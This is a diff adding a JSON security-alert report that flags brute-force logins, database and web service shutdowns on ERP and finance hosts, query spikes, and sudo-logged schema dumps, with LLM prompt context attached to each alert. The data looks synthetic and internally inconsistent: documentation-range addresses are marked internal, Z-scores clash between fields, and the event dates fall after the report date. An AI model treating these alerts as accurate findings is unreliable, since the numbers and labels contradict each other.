@@ -1,0 +1,1698 @@
+{
+  "generated_at": "2026-01-21T06:28:56.651310+00:00",
+  "summary": {
+    "total_alerts": 54,
+    "severity_breakdown": {
+      "WARNING": 22,
+      "CRITICAL": 32
+    },
+    "type_breakdown": {
+      "credential_bruteforce_detected": 6,
+      "service_manipulation_detected": 13,
+      "anomalous_data_access": 6,
+      "new_user": 3,
+      "sensitive_db_access_detected": 5,
+      "user_events_spike": 5,
+      "user_unique_src_ips_spike": 5,
+      "blocked_actions_spike": 5,
+      "cron_job_overlap": 1,
+      "ssh_lateral_movement": 5
+    },
+    "top_subjects": [
+      "10.0.0.2",
+      "db-fin01",
+      "203.0.113.100",
+      "192.168.1.101",
+      "ubuntu",
+      "trinhk",
+      "(unknown)(via thuongf)",
+      "192.168.1.100",
+      "ngocmai",
+      "thuongf"
+    ]
+  },
+  "alerts": [
+    {
+      "type": "credential_bruteforce_detected",
+      "subject": "10.0.0.2",
+      "severity": "WARNING",
+      "score": 5.7142857142857135,
+      "text": "Credential brute force detected from internal IP 10.0.0.2: 8/14 failed attempts (57.1% failure rate).",
+      "evidence": {
+        "source_ip": "10.0.0.2",
+        "total_attempts": 14,
+        "failed_attempts": 8,
+        "failure_rate": 0.5714285714285714,
+        "is_external_ip": false
+      },
+      "prompt_ctx": {
+        "user": null,
+        "group": null,
+        "behavior": {
+          "type": "credential_bruteforce",
+          "source_ip": "10.0.0.2",
+          "attempts": 14,
+          "failures": 8,
+          "is_external": false
+        },
+        "time": null,
+        "baseline": {
+          "expected_failure_rate": 0.1
+        },
+        "extras": {
+          "reason": "Elevated login failure rate from internal IP 10.0.0.2"
+        }
+      }
+    },
+    {
+      "type": "credential_bruteforce_detected",
+      "subject": "172.16.0.1",
+      "severity": "WARNING",
+      "score": 4.444444444444445,
+      "text": "Credential brute force detected from internal IP 172.16.0.1: 8/18 failed attempts (44.4% failure rate).",
+      "evidence": {
+        "source_ip": "172.16.0.1",
+        "total_attempts": 18,
+        "failed_attempts": 8,
+        "failure_rate": 0.4444444444444444,
+        "is_external_ip": false
+      },
+      "prompt_ctx": {
+        "user": null,
+        "group": null,
+        "behavior": {
+          "type": "credential_bruteforce",
+          "source_ip": "172.16.0.1",
+          "attempts": 18,
+          "failures": 8,
+          "is_external": false
+        },
+        "time": null,
+        "baseline": {
+          "expected_failure_rate": 0.1
+        },
+        "extras": {
+          "reason": "High login failure rate from 172.16.0.1"
+        }
+      }
+    },
+    {
+      "type": "credential_bruteforce_detected",
+      "subject": "192.168.1.100",
+      "severity": "WARNING",
+      "score": 5.6000000000000005,
+      "text": "Credential brute force detected from internal IP 192.168.1.100: 14/25 failed attempts (56.0% failure rate).",
+      "evidence": {
+        "source_ip": "192.168.1.100",
+        "total_attempts": 25,
+        "failed_attempts": 14,
+        "failure_rate": 0.56,
+        "is_external_ip": false
+      },
+      "prompt_ctx": {
+        "user": null,
+        "group": null,
+        "behavior": {
+          "type": "credential_bruteforce",
+          "source_ip": "192.168.1.100",
+          "attempts": 25,
+          "failures": 14,
+          "is_external": false
+        },
+        "time": null,
+        "baseline": {
+          "expected_failure_rate": 0.1
+        },
+        "extras": {
+          "reason": "Elevated login failure rate from internal IP 192.168.1.100"
+        }
+      }
+    },
+    {
+      "type": "credential_bruteforce_detected",
+      "subject": "192.168.1.101",
+      "severity": "WARNING",
+      "score": 5.454545454545454,
+      "text": "Credential brute force detected from internal IP 192.168.1.101: 12/22 failed attempts (54.5% failure rate).",
+      "evidence": {
+        "source_ip": "192.168.1.101",
+        "total_attempts": 22,
+        "failed_attempts": 12,
+        "failure_rate": 0.5454545454545454,
+        "is_external_ip": false
+      },
+      "prompt_ctx": {
+        "user": null,
+        "group": null,
+        "behavior": {
+          "type": "credential_bruteforce",
+          "source_ip": "192.168.1.101",
+          "attempts": 22,
+          "failures": 12,
+          "is_external": false
+        },
+        "time": null,
+        "baseline": {
+          "expected_failure_rate": 0.1
+        },
+        "extras": {
+          "reason": "Elevated login failure rate from internal IP 192.168.1.101"
+        }
+      }
+    },
+    {
+      "type": "credential_bruteforce_detected",
+      "subject": "203.0.113.100",
+      "severity": "WARNING",
+      "score": 5.882352941176471,
+      "text": "Credential brute force detected from internal IP 203.0.113.100: 10/17 failed attempts (58.8% failure rate).",
+      "evidence": {
+        "source_ip": "203.0.113.100",
+        "total_attempts": 17,
+        "failed_attempts": 10,
+        "failure_rate": 0.5882352941176471,
+        "is_external_ip": false
+      },
+      "prompt_ctx": {
+        "user": null,
+        "group": null,
+        "behavior": {
+          "type": "credential_bruteforce",
+          "source_ip": "203.0.113.100",
+          "attempts": 17,
+          "failures": 10,
+          "is_external": false
+        },
+        "time": null,
+        "baseline": {
+          "expected_failure_rate": 0.1
+        },
+        "extras": {
+          "reason": "Elevated login failure rate from internal IP 203.0.113.100"
+        }
+      }
+    },
+    {
+      "type": "credential_bruteforce_detected",
+      "subject": "203.0.113.50",
+      "severity": "CRITICAL",
+      "score": 9.0,
+      "text": "Credential brute force detected from internal IP 203.0.113.50: 15/18 failed attempts (83.3% failure rate).",
+      "evidence": {
+        "source_ip": "203.0.113.50",
+        "total_attempts": 18,
+        "failed_attempts": 15,
+        "failure_rate": 0.8333333333333334,
+        "is_external_ip": false
+      },
+      "prompt_ctx": {
+        "user": null,
+        "group": null,
+        "behavior": {
+          "type": "credential_bruteforce",
+          "source_ip": "203.0.113.50",
+          "attempts": 18,
+          "failures": 15,
+          "is_external": false
+        },
+        "time": null,
+        "baseline": {
+          "expected_failure_rate": 0.1
+        },
+        "extras": {
+          "reason": "High login failure rate from internal IP 203.0.113.50 (brute force attack)"
+        }
+      }
+    },
+    {
+      "type": "service_manipulation_detected",
+      "subject": "thuongf",
+      "severity": "CRITICAL",
+      "score": 8.5,
+      "text": "🚨 SERVICE MANIPULATION: User 'thuongf' stopped apache 1x on erpsrv01. Web server shutdown - service disruption or pre-attack preparation",
+      "evidence": {
+        "method": "apache_stop",
+        "host": "erpsrv01",
+        "stop_count": 1,
+        "sample_message": "Stopping apache2 service (requested by thuongf)",
+        "defense_evasion": false
+      },
+      "prompt_ctx": {
+        "user": "thuongf",
+        "group": null,
+        "behavior": {
+          "type": "service_manipulation",
+          "method": "apache_stop",
+          "defense_evasion": false
+        },
+        "time": "02:35 PM, Thứ Ba, 27/10/2026",
+        "baseline": {},
+        "extras": {
+          "host": "erpsrv01",
+          "stop_count": 1
+        }
+      }
+    },
+    {
+      "type": "service_manipulation_detected",
+      "subject": "linhfin",
+      "severity": "CRITICAL",
+      "score": 8.5,
+      "text": "🚨 SERVICE MANIPULATION: User 'linhfin' stopped nginx 1x on db-fin01. Web server shutdown - service disruption or pre-attack preparation",
+      "evidence": {
+        "method": "nginx_stop",
+        "host": "db-fin01",
+        "stop_count": 1,
+        "sample_message": "Stopping nginx service (requested by linhfin)",
+        "defense_evasion": false
+      },
+      "prompt_ctx": {
+        "user": "linhfin",
+        "group": null,
+        "behavior": {
+          "type": "service_manipulation",
+          "method": "nginx_stop",
+          "defense_evasion": false
+        },
+        "time": "03:35 PM, Thứ Ba, 27/10/2026",
+        "baseline": {},
+        "extras": {
+          "host": "db-fin01",
+          "stop_count": 1
+        }
+      }
+    },
+    {
+      "type": "service_manipulation_detected",
+      "subject": "trinhk",
+      "severity": "CRITICAL",
+      "score": 8.5,
+      "text": "🚨 SERVICE MANIPULATION: User 'trinhk' stopped nginx 1x on erpsrv01. Web server shutdown - service disruption or pre-attack preparation",
+      "evidence": {
+        "method": "nginx_stop",
+        "host": "erpsrv01",
+        "stop_count": 1,
+        "sample_message": "Stopping nginx service (requested by trinhk)",
+        "defense_evasion": false
+      },
+      "prompt_ctx": {
+        "user": "trinhk",
+        "group": null,
+        "behavior": {
+          "type": "service_manipulation",
+          "method": "nginx_stop",
+          "defense_evasion": false
+        },
+        "time": "03:54 PM, Thứ Ba, 27/10/2026",
+        "baseline": {},
+        "extras": {
+          "host": "erpsrv01",
+          "stop_count": 1
+        }
+      }
+    },
+    {
+      "type": "service_manipulation_detected",
+      "subject": "thuongf",
+      "severity": "CRITICAL",
+      "score": 9.0,
+      "text": "🚨 SERVICE MANIPULATION: User 'thuongf' stopped postgresql 1x on erpsrv01. Database service shutdown - potential data attack or denial of service",
+      "evidence": {
+        "method": "postgresql_stop",
+        "host": "erpsrv01",
+        "stop_count": 1,
+        "sample_message": "Stopping postgresql service (requested by thuongf)",
+        "defense_evasion": false
+      },
+      "prompt_ctx": {
+        "user": "thuongf",
+        "group": null,
+        "behavior": {
+          "type": "service_manipulation",
+          "method": "postgresql_stop",
+          "defense_evasion": false
+        },
+        "time": "04:05 PM, Thứ Ba, 27/10/2026",
+        "baseline": {},
+        "extras": {
+          "host": "erpsrv01",
+          "stop_count": 1
+        }
+      }
+    },
+    {
+      "type": "service_manipulation_detected",
+      "subject": "anhthu",
+      "severity": "CRITICAL",
+      "score": 8.5,
+      "text": "🚨 SERVICE MANIPULATION: User 'anhthu' stopped apache 1x on erpsrv01. Web server shutdown - service disruption or pre-attack preparation",
+      "evidence": {
+        "method": "apache_stop",
+        "host": "erpsrv01",
+        "stop_count": 1,
+        "sample_message": "Stopping apache2 service (requested by anhthu)",
+        "defense_evasion": false
+      },
+      "prompt_ctx": {
+        "user": "anhthu",
+        "group": null,
+        "behavior": {
+          "type": "service_manipulation",
+          "method": "apache_stop",
+          "defense_evasion": false
+        },
+        "time": "04:05 PM, Thứ Ba, 27/10/2026",
+        "baseline": {},
+        "extras": {
+          "host": "erpsrv01",
+          "stop_count": 1
+        }
+      }
+    },
+    {
+      "type": "service_manipulation_detected",
+      "subject": "ngocmai",
+      "severity": "CRITICAL",
+      "score": 8.5,
+      "text": "🚨 SERVICE MANIPULATION: User 'ngocmai' stopped apache 2x on erpsrv01. Web server shutdown - service disruption or pre-attack preparation",
+      "evidence": {
+        "method": "apache_stop",
+        "host": "erpsrv01",
+        "stop_count": 2,
+        "sample_message": "Stopping apache2 service (requested by ngocmai)",
+        "defense_evasion": false
+      },
+      "prompt_ctx": {
+        "user": "ngocmai",
+        "group": null,
+        "behavior": {
+          "type": "service_manipulation",
+          "method": "apache_stop",
+          "defense_evasion": false
+        },
+        "time": "04:11 PM, Thứ Ba, 27/10/2026",
+        "baseline": {},
+        "extras": {
+          "host": "erpsrv01",
+          "stop_count": 2
+        }
+      }
+    },
+    {
+      "type": "service_manipulation_detected",
+      "subject": "ngocmai",
+      "severity": "CRITICAL",
+      "score": 8.5,
+      "text": "🚨 SERVICE MANIPULATION: User 'ngocmai' stopped nginx 1x on erpsrv01. Web server shutdown - service disruption or pre-attack preparation",
+      "evidence": {
+        "method": "nginx_stop",
+        "host": "erpsrv01",
+        "stop_count": 1,
+        "sample_message": "Stopping nginx service (requested by ngocmai)",
+        "defense_evasion": false
+      },
+      "prompt_ctx": {
+        "user": "ngocmai",
+        "group": null,
+        "behavior": {
+          "type": "service_manipulation",
+          "method": "nginx_stop",
+          "defense_evasion": false
+        },
+        "time": "05:01 PM, Thứ Ba, 27/10/2026",
+        "baseline": {},
+        "extras": {
+          "host": "erpsrv01",
+          "stop_count": 1
+        }
+      }
+    },
+    {
+      "type": "service_manipulation_detected",
+      "subject": "anhthu",
+      "severity": "CRITICAL",
+      "score": 8.5,
+      "text": "🚨 SERVICE MANIPULATION: User 'anhthu' stopped nginx 3x on filesrv-fin01. Web server shutdown - service disruption or pre-attack preparation",
+      "evidence": {
+        "method": "nginx_stop",
+        "host": "filesrv-fin01",
+        "stop_count": 3,
+        "sample_message": "Stopping nginx service (requested by anhthu)",
+        "defense_evasion": false
+      },
+      "prompt_ctx": {
+        "user": "anhthu",
+        "group": null,
+        "behavior": {
+          "type": "service_manipulation",
+          "method": "nginx_stop",
+          "defense_evasion": false
+        },
+        "time": "05:17 PM, Thứ Ba, 27/10/2026",
+        "baseline": {},
+        "extras": {
+          "host": "filesrv-fin01",
+          "stop_count": 3
+        }
+      }
+    },
+    {
+      "type": "service_manipulation_detected",
+      "subject": "thuongf",
+      "severity": "CRITICAL",
+      "score": 8.5,
+      "text": "🚨 SERVICE MANIPULATION: User 'thuongf' stopped apache 1x on filesrv-fin01. Web server shutdown - service disruption or pre-attack preparation",
+      "evidence": {
+        "method": "apache_stop",
+        "host": "filesrv-fin01",
+        "stop_count": 1,
+        "sample_message": "Stopping apache2 service (requested by thuongf)",
+        "defense_evasion": false
+      },
+      "prompt_ctx": {
+        "user": "thuongf",
+        "group": null,
+        "behavior": {
+          "type": "service_manipulation",
+          "method": "apache_stop",
+          "defense_evasion": false
+        },
+        "time": "05:26 PM, Thứ Ba, 27/10/2026",
+        "baseline": {},
+        "extras": {
+          "host": "filesrv-fin01",
+          "stop_count": 1
+        }
+      }
+    },
+    {
+      "type": "service_manipulation_detected",
+      "subject": "trinhk",
+      "severity": "CRITICAL",
+      "score": 9.0,
+      "text": "🚨 SERVICE MANIPULATION: User 'trinhk' stopped postgresql 3x on erpsrv01. Database service shutdown - potential data attack or denial of service",
+      "evidence": {
+        "method": "postgresql_stop",
+        "host": "erpsrv01",
+        "stop_count": 3,
+        "sample_message": "Stopping postgresql service (requested by trinhk)",
+        "defense_evasion": false
+      },
+      "prompt_ctx": {
+        "user": "trinhk",
+        "group": null,
+        "behavior": {
+          "type": "service_manipulation",
+          "method": "postgresql_stop",
+          "defense_evasion": false
+        },
+        "time": "05:43 PM, Thứ Ba, 27/10/2026",
+        "baseline": {},
+        "extras": {
+          "host": "erpsrv01",
+          "stop_count": 3
+        }
+      }
+    },
+    {
+      "type": "service_manipulation_detected",
+      "subject": "ngocmai",
+      "severity": "CRITICAL",
+      "score": 9.0,
+      "text": "🚨 SERVICE MANIPULATION: User 'ngocmai' stopped postgresql 1x on filesrv-fin01. Database service shutdown - potential data attack or denial of service",
+      "evidence": {
+        "method": "postgresql_stop",
+        "host": "filesrv-fin01",
+        "stop_count": 1,
+        "sample_message": "Stopping postgresql service (requested by ngocmai)",
+        "defense_evasion": false
+      },
+      "prompt_ctx": {
+        "user": "ngocmai",
+        "group": null,
+        "behavior": {
+          "type": "service_manipulation",
+          "method": "postgresql_stop",
+          "defense_evasion": false
+        },
+        "time": "06:08 PM, Thứ Ba, 27/10/2026",
+        "baseline": {},
+        "extras": {
+          "host": "filesrv-fin01",
+          "stop_count": 1
+        }
+      }
+    },
+    {
+      "type": "service_manipulation_detected",
+      "subject": "anhthu",
+      "severity": "CRITICAL",
+      "score": 8.5,
+      "text": "🚨 SERVICE MANIPULATION: User 'anhthu' stopped apache 1x on filesrv-fin01. Web server shutdown - service disruption or pre-attack preparation",
+      "evidence": {
+        "method": "apache_stop",
+        "host": "filesrv-fin01",
+        "stop_count": 1,
+        "sample_message": "Stopping apache2 service (requested by anhthu)",
+        "defense_evasion": false
+      },
+      "prompt_ctx": {
+        "user": "anhthu",
+        "group": null,
+        "behavior": {
+          "type": "service_manipulation",
+          "method": "apache_stop",
+          "defense_evasion": false
+        },
+        "time": "07:07 PM, Thứ Ba, 27/10/2026",
+        "baseline": {},
+        "extras": {
+          "host": "filesrv-fin01",
+          "stop_count": 1
+        }
+      }
+    },
+    {
+      "type": "service_manipulation_detected",
+      "subject": "trinhk",
+      "severity": "CRITICAL",
+      "score": 8.5,
+      "text": "🚨 SERVICE MANIPULATION: User 'trinhk' stopped nginx 1x on db-fin01. Web server shutdown - service disruption or pre-attack preparation",
+      "evidence": {
+        "method": "nginx_stop",
+        "host": "db-fin01",
+        "stop_count": 1,
+        "sample_message": "Stopping nginx service (requested by trinhk)",
+        "defense_evasion": false
+      },
+      "prompt_ctx": {
+        "user": "trinhk",
+        "group": null,
+        "behavior": {
+          "type": "service_manipulation",
+          "method": "nginx_stop",
+          "defense_evasion": false
+        },
+        "time": "07:26 PM, Thứ Ba, 27/10/2026",
+        "baseline": {},
+        "extras": {
+          "host": "db-fin01",
+          "stop_count": 1
+        }
+      }
+    },
+    {
+      "type": "anomalous_data_access",
+      "subject": "(unknown)(via thuongf)",
+      "severity": "CRITICAL",
+      "score": 6.4,
+      "text": "Phát hiện hoạt động truy cập dữ liệu bất thường từ user '(unknown)(via thuongf)': Database queries tăng đột ngột: 1692 (baseline: 0.0±0.1, Z=8.00)",
+      "evidence": {
+        "user": "(unknown)(via thuongf)",
+        "db_queries": 1692,
+        "db_queries_baseline": 0.0,
+        "suspicious_ops": 0,
+        "suspicious_ops_baseline": 0.0,
+        "z_queries": 1692.0,
+        "z_suspicious": 0.0,
+        "anomaly_score": 6.4,
+        "final_score": 6.4
+      },
+      "prompt_ctx": {
+        "user": "(unknown)",
+        "group": null,
+        "behavior": {
+          "type": "anomalous_data_access",
+          "db_queries_current": 1692,
+          "db_queries_baseline": 0.0,
+          "suspicious_ops_current": 0,
+          "suspicious_ops_baseline": 0.0
+        },
+        "time": null,
+        "baseline": {
+          "db_queries_mean": 0.0,
+          "db_queries_std": 0.1,
+          "suspicious_ops_mean": 0.0,
+          "suspicious_ops_std": 0.1
+        },
+        "extras": {
+          "reason": "Database queries tăng đột ngột: 1692 (baseline: 0.0±0.1, Z=8.00)"
+        }
+      }
+    },
+    {
+      "type": "anomalous_data_access",
+      "subject": "linhfin",
+      "severity": "CRITICAL",
+      "score": 9.6,
+      "text": "Phát hiện hoạt động truy cập dữ liệu bất thường từ user 'linhfin': Suspicious operations: 136 (baseline: 0.0±0.1, Z=8.00)",
+      "evidence": {
+        "user": "linhfin",
+        "db_queries": 0,
+        "db_queries_baseline": 0.0,
+        "suspicious_ops": 136,
+        "suspicious_ops_baseline": 0.0,
+        "z_queries": 0.0,
+        "z_suspicious": 136.0,
+        "anomaly_score": 9.6,
+        "final_score": 9.6
+      },
+      "prompt_ctx": {
+        "user": "linhfin",
+        "group": null,
+        "behavior": {
+          "type": "anomalous_data_access",
+          "db_queries_current": 0,
+          "db_queries_baseline": 0.0,
+          "suspicious_ops_current": 136,
+          "suspicious_ops_baseline": 0.0
+        },
+        "time": null,
+        "baseline": {
+          "db_queries_mean": 0.0,
+          "db_queries_std": 0.1,
+          "suspicious_ops_mean": 0.0,
+          "suspicious_ops_std": 0.1
+        },
+        "extras": {
+          "reason": "Suspicious operations: 136 (baseline: 0.0±0.1, Z=8.00)"
+        }
+      }
+    },
+    {
+      "type": "anomalous_data_access",
+      "subject": "thuongf",
+      "severity": "CRITICAL",
+      "score": 9.6,
+      "text": "Phát hiện hoạt động truy cập dữ liệu bất thường từ user 'thuongf': Suspicious operations: 153 (baseline: 0.0±0.1, Z=8.00)",
+      "evidence": {
+        "user": "thuongf",
+        "db_queries": 0,
+        "db_queries_baseline": 0.0,
+        "suspicious_ops": 153,
+        "suspicious_ops_baseline": 0.0,
+        "z_queries": 0.0,
+        "z_suspicious": 153.0,
+        "anomaly_score": 9.6,
+        "final_score": 9.6
+      },
+      "prompt_ctx": {
+        "user": "thuongf",
+        "group": null,
+        "behavior": {
+          "type": "anomalous_data_access",
+          "db_queries_current": 0,
+          "db_queries_baseline": 0.0,
+          "suspicious_ops_current": 153,
+          "suspicious_ops_baseline": 0.0
+        },
+        "time": null,
+        "baseline": {
+          "db_queries_mean": 0.0,
+          "db_queries_std": 0.1,
+          "suspicious_ops_mean": 0.0,
+          "suspicious_ops_std": 0.1
+        },
+        "extras": {
+          "reason": "Suspicious operations: 153 (baseline: 0.0±0.1, Z=8.00)"
+        }
+      }
+    },
+    {
+      "type": "anomalous_data_access",
+      "subject": "anhthu",
+      "severity": "CRITICAL",
+      "score": 9.6,
+      "text": "Phát hiện hoạt động truy cập dữ liệu bất thường từ user 'anhthu': Suspicious operations: 106 (baseline: 0.0±0.1, Z=8.00)",
+      "evidence": {
+        "user": "anhthu",
+        "db_queries": 0,
+        "db_queries_baseline": 0.0,
+        "suspicious_ops": 106,
+        "suspicious_ops_baseline": 0.0,
+        "z_queries": 0.0,
+        "z_suspicious": 106.0,
+        "anomaly_score": 9.6,
+        "final_score": 9.6
+      },
+      "prompt_ctx": {
+        "user": "anhthu",
+        "group": null,
+        "behavior": {
+          "type": "anomalous_data_access",
+          "db_queries_current": 0,
+          "db_queries_baseline": 0.0,
+          "suspicious_ops_current": 106,
+          "suspicious_ops_baseline": 0.0
+        },
+        "time": null,
+        "baseline": {
+          "db_queries_mean": 0.0,
+          "db_queries_std": 0.1,
+          "suspicious_ops_mean": 0.0,
+          "suspicious_ops_std": 0.1
+        },
+        "extras": {
+          "reason": "Suspicious operations: 106 (baseline: 0.0±0.1, Z=8.00)"
+        }
+      }
+    },
+    {
+      "type": "anomalous_data_access",
+      "subject": "trinhk",
+      "severity": "CRITICAL",
+      "score": 9.6,
+      "text": "Phát hiện hoạt động truy cập dữ liệu bất thường từ user 'trinhk': Suspicious operations: 127 (baseline: 0.0±0.1, Z=8.00)",
+      "evidence": {
+        "user": "trinhk",
+        "db_queries": 0,
+        "db_queries_baseline": 0.0,
+        "suspicious_ops": 127,
+        "suspicious_ops_baseline": 0.0,
+        "z_queries": 0.0,
+        "z_suspicious": 127.0,
+        "anomaly_score": 9.6,
+        "final_score": 9.6
+      },
+      "prompt_ctx": {
+        "user": "trinhk",
+        "group": null,
+        "behavior": {
+          "type": "anomalous_data_access",
+          "db_queries_current": 0,
+          "db_queries_baseline": 0.0,
+          "suspicious_ops_current": 127,
+          "suspicious_ops_baseline": 0.0
+        },
+        "time": null,
+        "baseline": {
+          "db_queries_mean": 0.0,
+          "db_queries_std": 0.1,
+          "suspicious_ops_mean": 0.0,
+          "suspicious_ops_std": 0.1
+        },
+        "extras": {
+          "reason": "Suspicious operations: 127 (baseline: 0.0±0.1, Z=8.00)"
+        }
+      }
+    },
+    {
+      "type": "anomalous_data_access",
+      "subject": "ngocmai",
+      "severity": "CRITICAL",
+      "score": 9.6,
+      "text": "Phát hiện hoạt động truy cập dữ liệu bất thường từ user 'ngocmai': Suspicious operations: 134 (baseline: 0.0±0.1, Z=8.00)",
+      "evidence": {
+        "user": "ngocmai",
+        "db_queries": 0,
+        "db_queries_baseline": 0.0,
+        "suspicious_ops": 134,
+        "suspicious_ops_baseline": 0.0,
+        "z_queries": 0.0,
+        "z_suspicious": 134.0,
+        "anomaly_score": 9.6,
+        "final_score": 9.6
+      },
+      "prompt_ctx": {
+        "user": "ngocmai",
+        "group": null,
+        "behavior": {
+          "type": "anomalous_data_access",
+          "db_queries_current": 0,
+          "db_queries_baseline": 0.0,
+          "suspicious_ops_current": 134,
+          "suspicious_ops_baseline": 0.0
+        },
+        "time": null,
+        "baseline": {
+          "db_queries_mean": 0.0,
+          "db_queries_std": 0.1,
+          "suspicious_ops_mean": 0.0,
+          "suspicious_ops_std": 0.1
+        },
+        "extras": {
+          "reason": "Suspicious operations: 134 (baseline: 0.0±0.1, Z=8.00)"
+        }
+      }
+    },
+    {
+      "type": "new_user",
+      "subject": "root",
+      "severity": "WARNING",
+      "score": 4.0,
+      "text": "User mới root xuất hiện với 27 sự kiện, chưa có trong baseline.",
+      "evidence": {
+        "events": 27
+      },
+      "prompt_ctx": {
+        "user": "root",
+        "group": null,
+        "behavior": {
+          "type": "new_user",
+          "events": 27
+        },
+        "time": null,
+        "baseline": {},
+        "extras": {
+          "reason": "User chưa có trong baseline"
+        }
+      }
+    },
+    {
+      "type": "new_user",
+      "subject": "ubuntu",
+      "severity": "WARNING",
+      "score": 4.0,
+      "text": "User mới ubuntu xuất hiện với 22 sự kiện, chưa có trong baseline.",
+      "evidence": {
+        "events": 22
+      },
+      "prompt_ctx": {
+        "user": "ubuntu",
+        "group": null,
+        "behavior": {
+          "type": "new_user",
+          "events": 22
+        },
+        "time": null,
+        "baseline": {},
+        "extras": {
+          "reason": "User chưa có trong baseline"
+        }
+      }
+    },
+    {
+      "type": "new_user",
+      "subject": "admin",
+      "severity": "WARNING",
+      "score": 4.0,
+      "text": "User mới admin xuất hiện với 30 sự kiện, chưa có trong baseline.",
+      "evidence": {
+        "events": 30
+      },
+      "prompt_ctx": {
+        "user": "admin",
+        "group": null,
+        "behavior": {
+          "type": "new_user",
+          "events": 30
+        },
+        "time": null,
+        "baseline": {},
+        "extras": {
+          "reason": "User chưa có trong baseline"
+        }
+      }
+    },
+    {
+      "type": "sensitive_db_access_detected",
+      "subject": "thuongf",
+      "severity": "WARNING",
+      "score": 7.0,
+      "text": "Sensitive database operation by thuongf: thuongf : tty=pts/0 ; pwd=/home/thuongf ; user=root ; command=/usr/bin/pg_dump --schema-only erpdb",
+      "evidence": {
+        "operation": "database_dump",
+        "message": "thuongf : tty=pts/0 ; pwd=/home/thuongf ; user=root ; command=/usr/bin/pg_dump --schema-only erpdb"
+      },
+      "prompt_ctx": {
+        "user": "thuongf",
+        "group": null,
+        "behavior": {
+          "type": "database_access",
+          "operation": "database_dump"
+        },
+        "time": "02:31 PM, Thứ Ba, 27/10/2026",
+        "baseline": {},
+        "extras": {
+          "reason": "Sensitive database operation detected"
+        }
+      }
+    },
+    {
+      "type": "sensitive_db_access_detected",
+      "subject": "ngocmai",
+      "severity": "WARNING",
+      "score": 7.0,
+      "text": "Sensitive database operation by ngocmai: ngocmai : tty=pts/0 ; pwd=/home/ngocmai ; user=root ; command=/usr/bin/pg_dump --schema-only erpdb",
+      "evidence": {
+        "operation": "database_dump",
+        "message": "ngocmai : tty=pts/0 ; pwd=/home/ngocmai ; user=root ; command=/usr/bin/pg_dump --schema-only erpdb"
+      },
+      "prompt_ctx": {
+        "user": "ngocmai",
+        "group": null,
+        "behavior": {
+          "type": "database_access",
+          "operation": "database_dump"
+        },
+        "time": "02:37 PM, Thứ Ba, 27/10/2026",
+        "baseline": {},
+        "extras": {
+          "reason": "Sensitive database operation detected"
+        }
+      }
+    },
+    {
+      "type": "sensitive_db_access_detected",
+      "subject": "linhfin",
+      "severity": "WARNING",
+      "score": 7.0,
+      "text": "Sensitive database operation by linhfin: linhfin : tty=pts/0 ; pwd=/home/linhfin ; user=root ; command=/usr/bin/pg_dump --schema-only erpdb",
+      "evidence": {
+        "operation": "database_dump",
+        "message": "linhfin : tty=pts/0 ; pwd=/home/linhfin ; user=root ; command=/usr/bin/pg_dump --schema-only erpdb"
+      },
+      "prompt_ctx": {
+        "user": "linhfin",
+        "group": null,
+        "behavior": {
+          "type": "database_access",
+          "operation": "database_dump"
+        },
+        "time": "02:46 PM, Thứ Ba, 27/10/2026",
+        "baseline": {},
+        "extras": {
+          "reason": "Sensitive database operation detected"
+        }
+      }
+    },
+    {
+      "type": "sensitive_db_access_detected",
+      "subject": "anhthu",
+      "severity": "WARNING",
+      "score": 7.0,
+      "text": "Sensitive database operation by anhthu: anhthu : tty=pts/0 ; pwd=/home/anhthu ; user=root ; command=/usr/bin/pg_dump --schema-only erpdb",
+      "evidence": {
+        "operation": "database_dump",
+        "message": "anhthu : tty=pts/0 ; pwd=/home/anhthu ; user=root ; command=/usr/bin/pg_dump --schema-only erpdb"
+      },
+      "prompt_ctx": {
+        "user": "anhthu",
+        "group": null,
+        "behavior": {
+          "type": "database_access",
+          "operation": "database_dump"
+        },
+        "time": "02:49 PM, Thứ Ba, 27/10/2026",
+        "baseline": {},
+        "extras": {
+          "reason": "Sensitive database operation detected"
+        }
+      }
+    },
+    {
+      "type": "sensitive_db_access_detected",
+      "subject": "trinhk",
+      "severity": "WARNING",
+      "score": 7.0,
+      "text": "Sensitive database operation by trinhk: trinhk : tty=pts/0 ; pwd=/home/trinhk ; user=root ; command=/usr/bin/pg_dump --schema-only erpdb",
+      "evidence": {
+        "operation": "database_dump",
+        "message": "trinhk : tty=pts/0 ; pwd=/home/trinhk ; user=root ; command=/usr/bin/pg_dump --schema-only erpdb"
+      },
+      "prompt_ctx": {
+        "user": "trinhk",
+        "group": null,
+        "behavior": {
+          "type": "database_access",
+          "operation": "database_dump"
+        },
+        "time": "03:14 PM, Thứ Ba, 27/10/2026",
+        "baseline": {},
+        "extras": {
+          "reason": "Sensitive database operation detected"
+        }
+      }
+    },
+    {
+      "type": "user_events_spike",
+      "subject": "anhthu",
+      "severity": "CRITICAL",
+      "score": 9.054054054054054,
+      "text": "Số sự kiện của user anhthu tăng đột biến: 335 so với trung bình 74±0.",
+      "evidence": {
+        "current": 335,
+        "mean": 74.0,
+        "std": 0.0
+      },
+      "prompt_ctx": {
+        "user": "anhthu",
+        "group": null,
+        "behavior": {
+          "type": "events",
+          "value": 335
+        },
+        "time": null,
+        "baseline": {
+          "mean": 74.0,
+          "std": 0.0
+        },
+        "extras": {}
+      }
+    },
+    {
+      "type": "user_events_spike",
+      "subject": "linhfin",
+      "severity": "CRITICAL",
+      "score": 9.924050632911392,
+      "text": "Số sự kiện của user linhfin tăng đột biến: 392 so với trung bình 79±0.",
+      "evidence": {
+        "current": 392,
+        "mean": 79.0,
+        "std": 0.0
+      },
+      "prompt_ctx": {
+        "user": "linhfin",
+        "group": null,
+        "behavior": {
+          "type": "events",
+          "value": 392
+        },
+        "time": null,
+        "baseline": {
+          "mean": 79.0,
+          "std": 0.0
+        },
+        "extras": {}
+      }
+    },
+    {
+      "type": "user_events_spike",
+      "subject": "ngocmai",
+      "severity": "CRITICAL",
+      "score": 9.283950617283951,
+      "text": "Số sự kiện của user ngocmai tăng đột biến: 376 so với trung bình 81±0.",
+      "evidence": {
+        "current": 376,
+        "mean": 81.0,
+        "std": 0.0
+      },
+      "prompt_ctx": {
+        "user": "ngocmai",
+        "group": null,
+        "behavior": {
+          "type": "events",
+          "value": 376
+        },
+        "time": null,
+        "baseline": {
+          "mean": 81.0,
+          "std": 0.0
+        },
+        "extras": {}
+      }
+    },
+    {
+      "type": "user_events_spike",
+      "subject": "thuongf",
+      "severity": "CRITICAL",
+      "score": 9.75,
+      "text": "Số sự kiện của user thuongf tăng đột biến: 507 so với trung bình 104±0.",
+      "evidence": {
+        "current": 507,
+        "mean": 104.0,
+        "std": 0.0
+      },
